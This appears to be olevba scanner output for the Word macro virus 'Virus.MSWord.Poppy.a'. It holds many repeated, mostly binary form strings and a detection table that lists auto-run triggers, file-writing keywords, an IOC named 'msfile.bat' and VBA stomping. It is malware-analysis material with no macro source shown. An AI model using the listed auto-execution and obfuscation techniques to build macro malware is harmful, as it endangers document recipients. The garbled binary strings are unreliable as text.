- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��g��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%N	a�����8㎃ldc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܬ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p2[�:`4�w@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$� g׮a�2�J�-�!s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W>�p��2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�I��n���0�V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WV�+yk���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������C�*�[.@%�韧E�i��l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nq�ꅦ�3D*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�>�G����Ӯ�!P�`{c��r�ɐ�*�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M.%+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�N�vK&A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X���Z7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʐ���68���t���M$&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��`�=����I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˲�H�0AB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=U-4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'���:H��$�]��٩(�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ol2�q�+�iYO� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JX�i&Uq4�,r��`U��@��r�Nx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bڦ�U�@�v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'Ӣ���P�%8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�H!�� ���.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g���+�Dm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U���bq���y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Pdh�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	'׃�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�(�̾�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	*�`�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���!"�%�>�>���Ԧ0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�=x�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@;=~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �F1�r)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#ۮ��.c8ߒ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�$g������B�bX�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�_F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T����Ҥ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'@�G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��HH��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�>����H��5�J~RQ������D7m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�|����M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`��F}��H�h��H��Ӟs���/��ǿ\��v`��2}:D�����o2%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�຃����ʊ�yt��0��IW�c�2�DRK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�$�A)�����\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�v��}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.����3f��g�y���Ux�7�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s���x��G��A �u��0��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iW��p�$}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ns���1,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$���#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�C�nT��=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~&�q��%U�C��'�Mr��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Don't Blee
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Bleeg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Grab A Beer?D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

